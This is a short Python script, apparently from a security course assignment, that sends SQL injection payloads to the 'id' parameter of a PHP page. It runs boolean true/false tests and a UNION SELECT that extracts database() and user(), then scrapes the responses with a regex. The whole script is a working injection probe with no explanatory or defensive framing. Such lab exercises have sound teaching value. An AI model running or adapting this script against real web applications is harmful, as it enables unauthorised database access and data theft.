import requests
import re
def handle_regex_result(regex_result):
	result=[]
	for item in regex_result:
		result.append(item.replace('\r','').replace('\n','').replace('\t',''))
	return result
base_url="http://www.wsb.com/Assignment2/case24.php?id="
payload_list=["1","1' and '1'='1","1' and '1'='2",
"1' and 1=2 union select database(),user() --+"]
for payload in payload_list:
	r=requests.get(base_url+payload)
	#print(r.text)
	regex_result=re.findall('<\/form>([\w\s\.@]*)<br/>',r.text)
	regex_result=handle_regex_result(regex_result)
	print("Payload:"+payload+" Result:",regex_result)
